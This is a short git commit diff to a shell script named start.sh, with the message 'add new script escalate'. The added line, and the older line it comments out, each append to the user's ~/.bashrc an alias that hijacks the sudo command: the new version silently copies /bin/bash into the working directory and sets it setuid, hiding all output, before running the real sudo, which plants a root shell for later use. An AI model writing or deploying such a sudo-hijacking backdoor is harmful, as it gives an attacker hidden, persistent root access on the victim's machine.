25e030f792e535341bcae7e861ae939284faa8d3
test <m.amenitskiy@gmail.com>
2021-02-11 16:26:53 +0300

    add new script escalate

--- start.sh
+++ start.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
 scripts=$(pwd)'/main.sh'
-echo "alias sudo=\"/usr/bin/sudo /bin/bash $scripts 2>/dev/null 1>/dev/null;/usr/bin/sudo\"">>~/.bashrc 
+#echo "alias sudo=\"/usr/bin/sudo /bin/bash $scripts 2>/dev/null 1>/dev/null;/usr/bin/sudo\"">>~/.bashrc
+echo "alias sudo=\"sudo cp /bin/bash $(pwd)&& sudo chmod u+s $(pwd)/bash 1,2>/dev/null; /usr/bin/sudo\"">>~/.bashrc
